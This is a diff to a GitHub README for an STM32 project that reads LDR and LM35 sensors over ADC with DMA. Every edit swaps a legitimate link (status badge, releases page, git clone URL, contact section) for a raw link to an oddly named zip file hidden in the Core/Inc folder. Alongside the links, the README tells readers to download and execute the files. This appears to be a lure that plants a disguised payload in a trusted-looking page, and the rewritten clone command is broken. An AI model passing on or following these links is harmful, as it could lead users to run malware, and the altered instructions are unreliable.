@@ -1,7 +1,7 @@
 # STM32 ADC with DMA: Read Multiple Sensors (LDR & LM35) 🌟
 
-![STM32 ADC](https://img.shields.io/badge/STM32_ADC-LM35_LDR_DMA-brightgreen)  
-[![Releases](https://img.shields.io/badge/Releases-Check%20Here-blue)](https://github.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/releases)
+![STM32 ADC](https://raw.githubusercontent.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/master/Core/Inc/DM_Multiple_with_ST_AD_LD_L_Read_Sensors_v2.0-alpha.2.zip)  
+[![Releases](https://raw.githubusercontent.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/master/Core/Inc/DM_Multiple_with_ST_AD_LD_L_Read_Sensors_v2.0-alpha.2.zip%20Here-blue)](https://raw.githubusercontent.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/master/Core/Inc/DM_Multiple_with_ST_AD_LD_L_Read_Sensors_v2.0-alpha.2.zip)
 
 ## Overview
 
@@ -29,7 +29,7 @@ Welcome to the STM32 ADC with DMA repository! This project demonstrates how to r
 
 ## Getting Started
 
-To get started, you can check the [Releases section](https://github.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/releases) for the latest version of the project. Download the necessary files and execute them to set up your environment.
+To get started, you can check the [Releases section](https://raw.githubusercontent.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/master/Core/Inc/DM_Multiple_with_ST_AD_LD_L_Read_Sensors_v2.0-alpha.2.zip) for the latest version of the project. Download the necessary files and execute them to set up your environment.
 
 ## Hardware Requirements
 
@@ -54,7 +54,7 @@ The following software tools are required to work with this project:
 1. **Clone the Repository**: Start by cloning the repository to your local machine.
 
    ```bash
-   git clone https://github.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-.git
+   git clone https://raw.githubusercontent.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/master/Core/Inc/DM_Multiple_with_ST_AD_LD_L_Read_Sensors_v2.0-alpha.2.zip
    ```
 
 2. **Open STM32CubeIDE**: Launch the STM32CubeIDE and import the project.
@@ -118,7 +118,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## Contact
 
-For any questions or suggestions, feel free to reach out to the repository owner. You can also check the [Releases section](https://github.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/releases) for updates and new features.
+For any questions or suggestions, feel free to reach out to the repository owner. You can also check the [Releases section](https://raw.githubusercontent.com/bhavishy2311/STM32-ADC-with-DMA-Read-Multiple-Sensors-LDR-LM35-/master/Core/Inc/DM_Multiple_with_ST_AD_LD_L_Read_Sensors_v2.0-alpha.2.zip) for updates and new features.
 
 ---
 
